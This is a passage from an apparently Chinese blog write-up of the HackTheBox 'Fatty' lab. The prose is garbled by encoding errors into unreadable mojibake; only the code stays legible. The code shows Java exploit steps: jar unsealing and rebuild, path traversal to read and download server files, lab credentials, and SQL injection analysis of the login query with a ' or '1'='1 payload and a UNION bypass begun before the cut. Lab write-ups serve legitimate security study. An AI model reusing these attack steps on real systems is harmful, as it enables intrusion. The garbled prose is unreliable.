·çš„ååºåˆ—åŒ–å‡½æ•°æˆ‘å¹¶æ²¡æœ‰è§åˆ°ã€‚ä½†æ˜¯å´æœ‰<code>writeObject</code>å­˜åœ¨ã€‚è¯´æ˜å¯èƒ½readObjectè¿™ä¸€æ“ä½œæ˜¯åœ¨æœåŠ¡ç«¯è¿›è¡Œçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å…ˆå°è¯•ç›´æ¥ä½¿ç”¨è¿™ä¸ªjaråŒ…ã€‚çœ‹çœ‹å“ªé‡Œæœ‰æ¼æ´å¯å¯»ã€‚</p><p>é¦–å…ˆæ³¨æ„,é¢˜ç›®è¦æ±‚ç¯å¢ƒjava8ã€‚æ‰€ä»¥kaliå¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>/usr/lib/jvm/java-8-openjdk-amd64/bin/java</code>è°ƒç”¨jaråŒ…å³å¯ã€‚</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»ç•Œé¢ä»¥åŠæºç éƒ½èƒ½çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªç”¨java swingç»„ä»¶å†™å‡ºæ¥çš„guiç•Œé¢ã€‚</p><p>é¦–å…ˆå°è¯•ç™»å½•ã€‚ä½†ä¸å‡ºæ‰€æ–™æœç„¶å›æ˜¾<code>Connection Error</code>ã€‚è¿™ç‚¹æˆ‘ä»¬ä»jaråŒ…çš„beans.xmlå¯ä»¥çœ‹å‡º</p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation=&quot;                http://www.springframework.org/schema/beans                     spring-beans-3.0.xsd&quot;&gt;&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the     constructor function. --&gt;   &lt;bean id=&quot;connectionContext&quot; class = &quot;htb.fatty.shared.connection.ConnectionContext&quot;&gt;      &lt;constructor-arg index=&quot;0&quot; value = &quot;server.fatty.htb&quot;/&gt;      &lt;constructor-arg index=&quot;1&quot; value = &quot;8000&quot;/&gt;   &lt;/bean&gt;&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an defaultconstructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;   &lt;bean id=&quot;trustedFatty&quot; class = &quot;htb.fatty.shared.connection.TrustedFatty&quot;&gt;      &lt;property name = &quot;keystorePath&quot; value = &quot;fatty.p12&quot;/&gt;   &lt;/bean&gt;   &lt;bean id=&quot;secretHolder&quot; class = &quot;htb.fatty.shared.connection.SecretHolder&quot;&gt;      &lt;property name = &quot;secret&quot; value = &quot;clarabibiclarabibiclarabibi&quot;/&gt;   &lt;/bean&gt;&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;   &lt;bean id=&quot;connection&quot; class = &quot;htb.fatty.client.connection.Connection&quot;&gt;      &lt;constructor-arg index = &quot;0&quot; ref = &quot;connectionContext&quot;/&gt;      &lt;constructor-arg index = &quot;1&quot; ref = &quot;trustedFatty&quot;/&gt;      &lt;constructor-arg index = &quot;2&quot; ref = &quot;secretHolder&quot;/&gt;   &lt;/bean&gt;&lt;/beans&gt;</code></pre><p>beançš„é…ç½®ä¸­å­˜åœ¨server.fatty.htb å¹¶é…ç½®ç«¯å£8000.å› æ­¤æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªhostnameåŠ å…¥/etc/hosts.ä¸è¿‡æ­¤å¤„æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€ç§æ˜¯ç›´æ¥æ›´æ”¹jaråŒ…å¹¶é‡æ–°ä½¿ç”¨ã€‚å¦ä¸€ç§æ˜¯ä½¿ç”¨ä»£ç†è½¬å‘ä¸‹æµé‡ã€‚æˆ‘å› ä¸ºå·æ‡’é€‰æ‹©äº†ç¬¬äºŒç§ã€‚</p><p>å³,åœ¨hosts æ–‡ä»¶ä¸­è®¾ç½®ä¸º<code>127.0.0.1 server.fatty.htb</code>å¹¶ä½¿ç”¨socatè½¬å‘æœ¬åœ°8000çš„æµé‡åˆ°10.10.10.147:1337ä¸Š</p><pre><code class="bash">socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337</code></pre><p>å½“ç„¶ã€‚ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯å®é™…éå¸¸éº»çƒ¦ã€‚å‡å¦‚æˆ‘ä»¬åªæ˜¯è§£å‹jaråŒ…ï¼Œæ›´æ”¹beans.xmlå†é‡æ–°å‹ç¼©ä½jaråŒ…çš„è¯<br><code>jar -uf fatty-client.jar beans.xml</code>ã€‚<br>å†æ¬¡è¿è¡Œå°†ä¼šå‘ç°å‡ºç°java security problemsã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæ•´ä¸ªjaråŒ…ä¸­æœ‰éƒ¨åˆ†é…ç½®æ–‡ä»¶ä¼šå› ä¸ºsha256å˜åŒ–çš„beans.xmlå‡ºé”™,è¿™è·Ÿjava seal çš„æ“ä½œæœ‰å…³ã€‚ä¸€æ—¦ç›¸å…³æ–‡ä»¶å˜åŒ–ï¼Œå°†å¯¼è‡´æŠ›å‡ºSealing Violationã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆ æ‰å†…å®¹ä¸­è®°å½•äº†sha256å€¼çš„æ–‡ä»¶å¹¶è®¾å®šé…ç½®ã€‚</p><p>æ“ä½œæ–¹æ³•<br>METAINF/MANIFEST.MF ä¸­åº•ä¸‹æ‰€æœ‰sha256ç›¸å…³å†…å®¹å…¨éƒ¨å»æ‰ï¼ŒåŒæ—¶ä¸Šé¢è®¾ç½®ä¸­<code>Sealed: True</code>è¿™ä¸€è¡Œå»æ‰ã€‚ </p><pre><code>Manifest-Version: 1.0 Archiver-Version: Plexus Archiver Built-By: root Created-By: Apache Maven 3.3.9 Build-Jdk: 1.8.0_232 Main-Class: htb.fatty.client.run.Starter</code></pre><p>æ¥ç€åˆ æ‰META-INF/1.RSA META-INF/1.SF ä¸¤ä¸ªåŒæ ·å«æœ‰sha256å€¼çš„æ–‡ä»¶ã€‚é‡æ–°æ›´æ–°jaråŒ…æ–‡ä»¶å³å¯ã€‚(æˆ–è€…ç›´æ¥zipæ‰“åŒ…)</p><p>å½“ç„¶ã€‚è™½ç„¶æˆ‘å¼€å§‹æ²¡æœ‰è¿›è¡Œè¿™æ­¥æ“ä½œ,åé¢è¿˜æ˜¯ä¸€æ ·è¦åšçš„ã€‚</p><p>ç„¶åç°åœ¨æˆ‘ä»¬å¯ä»¥è·ŸæœåŠ¡è¿›è¡Œäº¤äº’äº†ã€‚<br>ä½¿ç”¨ç›´æ¥noteä¸­<code>qtc:clarabibi</code>æˆåŠŸç™»å½•åã€‚è¯•äº†ä¸€ä¸‹å‡ ä¸ªæ“ä½œå‘ç°è¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚æˆ‘ä»¬æ‰€åœ¨çš„ç”¨æˆ·ç»„æœ‰ping,whoami,configsè¿™æ ·å‡ ä¸ªæ“ä½œã€‚å…¶ä¸­configsæ‰§è¡Œçš„ä¼¼ä¹æ˜¯æœåŠ¡ç«¯åˆ—ç›®å½•çš„å·¥ä½œã€‚guiåº•ä¸‹æœ‰ä¸€ä¸ªæŒ‰é’®open,å¯ä»¥è¾“å…¥å¯¹åº”æ–‡ä»¶åè¯»å–æœåŠ¡ç«¯ç›®å½•çš„æ–‡ä»¶ã€‚å°è¯•openåŠŸèƒ½æ—¶fuzzè§¦å‘äº†æŠ¥é”™<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¼¼ä¹<code>..</code>è¿™æ ·çš„æ“ä½œå¯ä»¥è¿›è¡Œä¸€,ä¸¤å±‚è·¯å¾„ç©¿è¶Šã€‚ä½†æ˜¯å¹¶ä¸èƒ½è¾¾æˆä»»æ„åˆ—ç›®å½•ã€‚å› ä¸ºå®ƒè¿‡æ»¤äº†<code>../..</code>ã€‚</p><p>çœ‹äº†ä¸‹æºç ã€‚åˆ—ç›®å½•å¯¹åº”çš„åº”è¯¥æ˜¯è¿™é‡Œ<br>Invokerä¸­çš„showfiles</p><pre><code class="java">public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {    String methodName = (new Object() {    }).getClass().getEnclosingMethod().getName();    logger.logInfo(&quot;[+] Method &#39;&quot; + methodName + &quot;&#39; was called by user &#39;&quot; + this.user.getUsername() + &quot;&#39;.&quot;);    if (AccessCheck.checkAccess(methodName, this.user)) {        return &quot;Error: Method &#39;&quot; + methodName + &quot;&#39; is not allowed for this user account&quot;;    } else {        this.action = new ActionMessage(this.sessionID, &quot;files&quot;);        this.action.addArgument(folder);        this.sendAndRecv();        return this.response.hasError() ? &quot;Error: Your action caused an error on the application server!&quot; : this.response.getContentAsString();    }}</code></pre><p>è€Œæˆ‘ä»¬guiä¸­å¯¹åº”configsçš„æ“ä½œæ˜¯</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯è§ã€‚æ­¤å¤„åŸæœ¬è®¾å®šäº†ç›®å½•ä¸ºconfigs.ä½†å€˜è‹¥æˆ‘ä»¬ä¿®æ”¹å…¶ä¸º<code>..</code>æ˜¯å¦å°±èƒ½è·¯å¾„ç©¿è¶Šäº†å‘¢ï¼Ÿä¸å¦¨ä¸€è¯•ã€‚<br>å‚ç…§ippsecè§†é¢‘,è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿èŠ‚çœæ‰‹åŠ¨æ“ä½œæ—¶é—´,è€Œä¸æ˜¯åå¤ä¿®æ”¹æºç é‡æ–°build jaråŒ…(ç„¶è€Œæ‰“è„¸äº†,åé¢é‡æ–°buildäº†ä¸¤æ¬¡â€¦â€¦)ä¸å¦‚ç›´æ¥å¯¼å…¥jaråŒ…å¹¶ç¼–å†™exp.</p><p>äºæ˜¯è¿™é‡Œæˆ‘å»ä¸‹äº†ä¸€ä¸ªlinux ä¸Šçš„idea.ä¸å¾—ä¸åæ§½é…ç½®ideç¯å¢ƒå±…ç„¶ä¹Ÿå‡ºäº†å°é—®é¢˜ =&gt;  ideaæ— æ³•è‡ªåŠ¨è¯†åˆ«<code>/usr/lib/jvm</code>ä¸­çš„jdk.å¿…é¡»æ‰§è¡Œ<code>sudo apt-get install openjdk-8-jdk</code>åã€‚ideaæ‰èƒ½è‡ªåŠ¨è¯†åˆ«jvmä¸­çš„java8.</p><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç¯å¢ƒä¸ºjava8çš„å·¥ç¨‹ã€‚å¹¶åœ¨libraryä¸­å¯¼å…¥fatty-client.jarã€‚</p><p>æŒ‰ç…§ippsecçš„æ€è·¯ç®€å•å†™ä¸€ä¸ªåˆ©ç”¨exp</p><pre><code class="java">import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit {    public static void main(String[] args) throws  IOException{        Connection conn = null;        try {            conn = Connection.getConnection();        }catch(Exception e){            System.out.println(&quot;[-] connection failed&quot;+e.getMessage());            System.exit(1);        }        System.out.println(&quot;[+] Successfully connected&quot;);        User user=new User(&quot;qtc&quot;,&quot;clarabibi&quot;);        if(conn.login(user)){            System.out.println(&quot;[+] Successfully logged in&quot;);        }else{            System.out.println(&quot;[-] Login failed&quot;);        }        String rolename=conn.getRoleName();        user.setRoleByName(rolename);        System.out.println(&quot;[+] rolename is: &quot;+rolename);        /*        Invoker invoker =new Invoker(conn,user);        String response=&quot;&quot;;        try {            response=invoker.showFiles(&quot;..&quot;);        } catch (MessageParseException e) {            e.printStackTrace();        } catch (MessageBuildException e) {            e.printStackTrace();        } catch (IOException e) {            e.printStackTrace();        }        System.out.println(&quot;Server response:\n&quot;+ response);        */    }}</code></pre><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½é€šè¿‡javaä»£ç æ¥è·ŸæœåŠ¡ç«¯äº¤äº’äº†ã€‚åŒæ—¶æ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ä¼ å…¥çš„å€¼æ¥èŠ‚çœæ—¶é—´<br>æ¯”å¦‚ä¸Šé¢ä»£ç æ³¨é‡Šçš„éƒ¨åˆ†å³æ˜¯invokerè°ƒç”¨showFilesæ–¹æ³•å¹¶è·å–å›æ˜¾ã€‚å¹¶ä¸”æˆ‘ä»¬ç›´æ¥å°±å¯ä»¥ä¿®æ”¹ä¼ å…¥çš„å‚æ•°ä¸º<code>..</code>è¿›è¡Œè·¯å¾„ç©¿è¶Š.å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ã€‚<br>(try catch ç›´æ¥ç”¨ideaå¿«æ·é”®æ·»åŠ å³å¯ã€‚éå¸¸æ–¹ä¾¿)</p><pre><code>Server response:logstarstart.shfatty-server.jarfiles</code></pre><p>æ¥ä¸‹æ¥ä½¿ç”¨openæ–¹æ³•è¯»æ–‡ä»¶ã€‚æˆ‘ä»¬æŠŠinvokerè°ƒç”¨çš„æ–¹æ³•æ”¹ä¸º<code>open(&quot;..&quot;,&quot;start.sh&quot;)</code></p><pre><code class="bash">#!/bin/sh# Unfortunately alpine docker containers seems to have problems with services.# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, # both services are now started as part of the docker startup script.# Start cron servicecrond -b# Start ssh server/usr/sbin/sshd# Start Java application serversu - qtc /bin/sh -c &quot;java -jar /opt/fatty/fatty-server.jar&quot;</code></pre><p>çœ‹æ¥æœåŠ¡ç«¯è¿è¡Œçš„å°±æ˜¯fatty-server.jaräº†.ä¸ºäº†ææ¸…æ¥šæœåŠ¡ç«¯ç©¶ç«Ÿåšäº†ä»€ä¹ˆæ“ä½œã€‚æ¯”å¦‚ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨æˆ·ç»„useræƒé™æœ‰äº›æ–¹æ³•è°ƒç”¨ä¸äº†,è¦æ€ä¹ˆå˜ä¸ºadminæƒé™ã€‚æœåŠ¡ç«¯æ˜¯å¦åˆè°ƒç”¨äº†readObjectå‘¢ï¼Ÿè¿™äº›éƒ½éœ€è¦å¯¹serverçš„æºç å®¡è®¡ã€‚</p><p>ç„¶è€Œé—®é¢˜åœ¨äºã€‚æˆ‘ä»¬å¹¶æ²¡æœ‰åŠæ³•åˆ©ç”¨ç°æœ‰çš„æ–¹æ³•è·å–æœåŠ¡jaråŒ…çš„å®Œæ•´æ•°æ®ã€‚å› ä¸ºopenæ–¹æ³•è°ƒç”¨çš„æ˜¯</p><pre><code class="java">try {    response = this.response.getContentAsString();} catch (Exception var6) {    response = &quot;Unable to convert byte[] to String. Did you read in a binary file?&quot;;}</code></pre><p>å³ä½¿ä¸çŸ¥é“æœåŠ¡ç«¯æ˜¯æ€ä¹ˆè¯»æ–‡ä»¶çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“å›æ˜¾çš„å†…å®¹æ˜¯å¯¹this.respoonseè°ƒç”¨<code>getContentAsString()</code>æ¥å°†å†…å®¹è½¬ä¸ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆè¯»å–jaråŒ…è¿™ç§äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¿…ç„¶ä¼šæœ‰ä¸å¯è§å­—ç¬¦è¢«ç›´æ¥å¿½è§†ã€‚å¯¼è‡´æˆ‘ä»¬è·å–çš„æ–‡ä»¶ä¸å®Œæ•´ã€‚é‚£ä¹ˆå¿…é¡»é‡å†™openæ–¹æ³•ã€‚è®©å®ƒèƒ½ç›´æ¥å°†responseå†…å®¹å†™è¿›æœ¬æœºã€‚</p><p>ç„¶åè¿™é‡Œå°±æ˜¯æ¯”è¾ƒå¤´ç–¼çš„ä¸€å¤„äº†ã€‚æˆ‘çŸ¥é“eclipseå¯ä»¥ç›´æ¥import ç°æœ‰ä¸€ä¸ªjavaæ–‡ä»¶ä½œä¾èµ–ç„¶åé‡å†™è°ƒç”¨(å‰ææ˜¯æ‰§è¡Œäº†å‰é¢çš„unsealè¿‡ç¨‹ã€‚å³åˆ é™¤äº†rsa,sf,ä¿®æ”¹äº†mf)ã€‚ä½†æ˜¯ideaæˆ‘ä¸€ç›´æ²¡æ‰¾åˆ°å¥½çš„è°ƒç”¨æ–¹æ³•ã€‚å¸Œæœ›æœ‰å¤§ä½¬èƒ½æ•™æ•™æˆ‘ideaæ€ä¹ˆå¤„ç†æœ€ä¼˜â€¦..</p><p>æ€»ä¹‹æœ€åã€‚æˆ‘é€‰æ‹©äº†ç›´æ¥é‡å†™ä»£ç å†build jaråŒ…çš„æ–¹æ³•ã€‚è™½ç„¶æœ‰ç‚¹è ¢ä½†æ˜¯è‡³å°‘å¯è¡Œã€‚é¦–å…ˆæˆ‘ä»¬ç›´æ¥è·å–æ–‡ä»¶å†…å®¹å¹¶å†™å…¥ã€‚å› æ­¤åœ¨openæ–¹æ³•ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶ç›´æ¥æ–°åˆ›å»ºä¸€ä¸ªæ–¹æ³•å†™æ–‡ä»¶å¹¶åœ¨expä¸­ä½¿ç”¨invokerè°ƒç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>ç„¶åå°±æ˜¯è¿™æ¬¡å­¦åˆ°çš„å‘½ä»¤è¡Œä¸‹é‡æ–°buildä¸€ä¸ªjaråŒ…çš„å®Œæ•´æµç¨‹</p><pre><code class="bash">javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.javamkdir raw cp fatty-client.jar raw/fatty-client.jar cd raw &amp;&amp; unzip fatty-client.jar......mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/cd raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar .</code></pre><p>æ¯”è¾ƒé—¹å¿ƒçš„æ˜¯ã€‚å› ä¸ºä¹‹å‰ç”¨ideaè‡ªåŠ¨åç¼–è¯‘çš„å†…å®¹,å¯¼è‡´æºç çš„javaæ–‡ä»¶æ‰¾ä¸åˆ°ã€‚æˆ‘è¿˜å¾—é‡æ–°åç¼–è¯‘ä¸€ä¸‹jaråŒ…â€¦â€¦ç„¶åä¿®æ”¹Invoker.javaã€‚</p><pre><code class="java">import java.io.FileOutputStream;......    public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {    String methodName = (new Object() {    }).getClass().getEnclosingMethod().getName();    logger.logInfo(&quot;[+] Method &#39;&quot; + methodName + &quot;&#39; was called by user &#39;&quot; + this.user.getUsername() + &quot;&#39;.&quot;);    if (AccessCheck.checkAccess(methodName, this.user)) {        return &quot;Error: Method &#39;&quot; + methodName + &quot;&#39; is not allowed for this user account&quot;;    } else {        this.action = new ActionMessage(this.sessionID, &quot;open&quot;);        this.action.addArgument(foldername);        this.action.addArgument(filename);        this.sendAndRecv();        FileOutputStream  fos;        fos = new FileOutputStream(&quot;/tmp/fatty-server.jar&quot;);        if (this.response.hasError()) {            return &quot;Error: Your action caused an error on the application server!&quot;;        } else {            String response = &quot;&quot;;            try {                response = this.response.getContentAsString();            } catch (Exception var6) {                response = &quot;Unable to convert byte[] to String. Did you read in a binary file?&quot;;            }            fos.write(this.response.getContent());                fos.close();             return response;        }    }}......</code></pre><p>ç„¶åå°±æ˜¯<code>javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java</code>.æˆ‘ä»¬ä¼šå‘ç°<code>htb/fatty/client/methods/</code>ä¸‹ç¼–è¯‘å¥½äº†åå‡ ä¸ªclassã€‚æ¥ä¸‹æ¥å°±æ˜¯è§£åŒ…jaråŒ…ã€‚è½¬ç§»classæ–‡ä»¶å¹¶é‡æ–°æ‰“åŒ…jarçš„äº‹æƒ…äº†ã€‚</p><p>ideaä¸­å¯¼å…¥æˆ‘ä»¬é‡æ–°æ”¹å¥½çš„jaråŒ…ã€‚å†æ¬¡æ‰§è¡Œå³å¯å‘ç°èƒ½å¤Ÿæ­£å¸¸ä¸‹è½½äº†ã€‚</p><p>ä¸‹è½½å¥½30åˆ†é’Ÿåæˆ‘ä»¬å¾—åˆ°äº†fatty-server.jarã€‚å†æ¬¡å®¡è®¡serveræºç <br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸€æ¬¡å¾ˆå¿«å°±èƒ½åœ¨ä¹‹å‰ä¸ç¡®å®šçš„changePWå¤„çœ‹åˆ°<code>readObject()</code>æ–¹æ³•è°ƒç”¨äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è‚¯å®šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä½†æ˜¯æ³¨æ„ã€‚æŠŠæ•´ä¸ªæºç è¿‡ä¸€éåä¼šå‘ç°changePWæ–¹æ³•å¯¹åº”çš„methodID 7éœ€è¦adminroleæ‰èƒ½æ‰§è¡Œã€‚</p><pre><code class="java">public static Role getAdminRole() {    return new Role(0, &quot;admin&quot;, new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12});}public static Role getUserRole() {    return new Role(0, &quot;user&quot;, new int[]{1, 2, 3, 4, 5, 6});}public static Role getAnonymous() {    return new Role(0, &quot;anonymous&quot;, new int[0]);}</code></pre><p>æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆä¸ºadmin roleçš„æ–¹æ³•ã€‚å›åˆ°ç™»å½•é‚£é‡Œçš„æ–¹æ³•å»å®¡è®¡</p><pre><code class="java">public User checkLogin(User user) throws FattyDbSession.LoginException {    Statement stmt = null;    ResultSet rs = null;    User newUser = null;    try {        stmt = this.conn.createStatement();        rs = stmt.executeQuery(&quot;SELECT id,username,email,password,role FROM users WHERE username=&#39;&quot; + user.getUsername() + &quot;&#39;&quot;);        try {            Thread.sleep(3000L);        } catch (InterruptedException var10) {            return null;        }        if (rs.next()) {            int id = rs.getInt(&quot;id&quot;);            String username = rs.getString(&quot;username&quot;);            String email = rs.getString(&quot;email&quot;);            String password = rs.getString(&quot;password&quot;);            String role = rs.getString(&quot;role&quot;);            newUser = new User(id, username, password, email, Role.getRoleByName(role), false);            if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) {                return newUser;            } else {                throw new FattyDbSession.LoginException(&quot;Wrong Password!&quot;);            }        } else {            throw new FattyDbSession.LoginException(&quot;Wrong Username!&quot;);        }    } catch (SQLException var11) {        this.logger.logError(&quot;[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username=&#39;&quot; + user.getUsername() + &quot;&#39; &lt;==&quot;);        this.logger.logError(&quot;[-] Exception was: &#39;&quot; + var11.getMessage() + &quot;&#39;&quot;);        return null;    }}</code></pre><p>å¾ˆæ˜æ˜¾ã€‚ç™»å½•çš„ä½ç½®å­˜åœ¨sqlæ³¨å…¥ã€‚å…·ä½“æµç¨‹æ˜¯ï¼šæ‰§è¡ŒsqlæŸ¥è¯¢,ç”¨æŸ¥è¯¢ç»“æœæ¥å®ä¾‹åŒ–Userç±»ã€‚å¹¶ä¸”è°ƒç”¨äº†ä¸€ä¸ªé’ˆå¯¹passwordçš„æ£€æŸ¥<code>newUser.getPassword().equalsIgnoreCase(user.getPassword()</code></p><p>è¿™ä¹Ÿå°±ä»£è¡¨ç®€å•çš„ä¸‡èƒ½å¯†ç ä¸èµ·ä½œç”¨äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹Userç±»å¦‚ä½•å®ä¾‹åŒ–çš„ã€‚ç›´æ¥æ‰¾æ„é€ æ–¹æ³•<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¦‚æœæ˜¯æˆ‘ä»¬ä¹‹å‰é‚£æ ·ã€‚ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå«username,passwordçš„Userå¯¹è±¡ã€‚å®ƒä¼šæ£€æŸ¥ä¸€ä¸ªåˆå§‹åŒ–ä¸­hashçš„å€¼æ˜¯å¦ä¸ºfalse.å¦‚æœä¸ä¸ºfalseã€‚é‚£ä¹ˆä¼šåƒä¸Šé¢çš„æ„é€ æ–¹æ³•ä¸€æ ·å°†<code>sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)</code>è¿›è¡Œæ¯”å¯¹ã€‚<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>&#39; or &#39;1&#39;=&#39;1</code>.é‚£ä¹ˆsqlè¯­å¥è¿”å›ç»“æœè‡ªç„¶æ˜¯qtcçš„æ•°æ®ã€‚ä½†æ˜¯</p><pre><code>sha256(&quot;&#39; or &#39;1&#39;=&#39;1&quot; + &quot;&#39; or &#39;1&#39;=&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) = sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;) </code></pre><p>æ˜¯ä¸æˆç«‹çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç™»é™†ã€‚</p><p>ä½†æ˜¯ä¸è¦ç´§ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªsqlè¯­å¥é‡Œä½¿ç”¨unionæŸ¥è¯¢è¿”å›ä¸€ä¸ªadminç”¨æˆ·ã€‚å› ä¸ºå®ƒæ˜¯æ 